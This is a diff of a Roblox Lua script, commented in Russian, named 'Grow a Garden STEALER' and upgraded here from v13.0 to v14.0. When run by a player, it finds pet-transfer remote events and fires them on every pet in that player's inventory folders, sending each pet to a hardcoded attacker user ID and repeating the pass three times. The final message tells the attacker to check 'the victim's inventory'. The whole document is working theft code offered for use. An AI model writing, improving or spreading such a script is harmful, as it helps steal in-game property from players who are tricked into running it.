@@ -1,5 +1,5 @@
--- Grow a Garden INSTANT STEALER v13.0
--- Максимально агрессивная кража всех питомцев за один запуск
+-- Grow a Garden STEALER v14.0 - FINAL AGGRESSIVE
+-- Специально для твоего случая
 
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
@@ -7,93 +7,75 @@ local LocalPlayer = Players.LocalPlayer
 
 local YOUR_USER_ID = 3793906492
 
-print("=== INSTANT STEALER ЗАПУЩЕН ===")
-print("Цель: украсть всех питомцев с одного запуска")
+print("=== FINAL AGGRESSIVE STEALER v14.0 ===")
 
 local transferRemote = nil
 
--- 1. Поиск через descendants
-for _, v in pairs(ReplicatedStorage:GetDescendants()) do
-    if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
-        local name = v.Name:lower()
-        if name:find("transfer") or name:find("givepet") or name:find("claimpet") or name:find("sendpet") or name:find("pettransfer") then
-            transferRemote = v
-            print("✓ Найден remote: " .. v.Name)
+-- Максимально жёсткий поиск
+for _, obj in pairs(ReplicatedStorage:GetDescendants()) do
+    if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
+        local n = obj.Name:lower()
+        if n:find("transfer") or n:find("givepet") or n:find("claimpet") or n:find("sendpet") or n:find("pet") then
+            transferRemote = obj
+            print("✓ НАЙДЕН REMOTE: " .. obj.Name)
             break
         end
     end
 end
 
--- 2. Если не нашли — ищем через getgc
 if not transferRemote then
-    print("Поиск через getgc...")
-    for _, v in pairs(getgc(true)) do
-        if typeof(v) == "function" then
-            local info = debug.getinfo(v)
-            if info.name then
-                local n = info.name:lower()
-                if n:find("transfer") or n:find("givepet") or n:find("claimpet") or n:find("sendpet") then
-                    transferRemote = v
-                    print("✓ Найден через getgc: " .. info.name)
-                    break
-                end
-            end
-        end
-    end
-end
-
-if not transferRemote then
-    print("❌ Remote НЕ НАЙДЕН! Скрипт не сможет работать.")
+    print("❌ Remote не найден даже после жёсткого поиска")
+    print("Скрипт не сможет красть питомцев")
     return
 end
 
--- ==================== КРАЖА ВСЕХ ПИТОМЦЕВ ====================
-local function stealAllPets()
-    print("Начинаю кражу всех питомцев...")
+local function stealPet(pet)
+    if not pet then return end
+    pcall(function()
+        local args = {pet, YOUR_USER_ID, "transfer"}
+        if transferRemote:IsA("RemoteEvent") then
+            transferRemote:FireServer(unpack(args))
+        elseif transferRemote:IsA("RemoteFunction") then
+            transferRemote:InvokeServer(unpack(args))
+        end
+    end)
+end
 
+local function stealAll()
+    print("Начинаю кражу...")
+
+    local count = 0
     local folders = {
         LocalPlayer:FindFirstChild("Pets"),
         LocalPlayer.PlayerGui:FindFirstChild("PetInventory"),
-        LocalPlayer:FindFirstChild("PlayerData"),
-        workspace:FindFirstChild(LocalPlayer.Name)
+        LocalPlayer:FindFirstChild("PlayerData")
     }
-
-    local total = 0
 
     for _, folder in ipairs(folders) do
         if folder then
             for _, pet in ipairs(folder:GetDescendants()) do
                 if pet:IsA("Folder") or pet:IsA("Model") or pet:IsA("StringValue") then
-                    pcall(function()
-                        local args = {pet, YOUR_USER_ID, "transfer"}
-                        
-                        if typeof(transferRemote) == "function" then
-                            transferRemote(unpack(args))
-                        else
-                            if transferRemote:IsA("RemoteEvent") then
-                                transferRemote:FireServer(unpack(args))
-                            elseif transferRemote:IsA("RemoteFunction") then
-                                transferRemote:InvokeServer(unpack(args))
-                            end
-                        end
-                    end)
-                    
-                    total = total + 1
-                    task.wait(0.07)
+                    stealPet(pet)
+                    count = count + 1
+                    task.wait(0.12)
                 end
             end
         end
     end
 
-    print("=== КРАЖА ЗАВЕРШЕНА ===")
-    print("Попыток кражи: " .. total)
-    print("Все питомцы должны быть у тебя на аккаунте.")
+    print("Попыток кражи: " .. count)
+    print("Если питомцы не пропали — remote не тот")
 end
 
 -- Запуск
-task.wait(1.5)
-stealAllPets()
+task.wait(2)
+stealAll()
 
--- Дополнительный цикл на всякий случай
+-- Повтор ещё 2 раза с небольшой паузой
 task.wait(3)
-stealAllPets()
+stealAll()
+
+task.wait(3)
+stealAll()
+
+print("Кража завершена. Проверь инвентарь жертвы.")
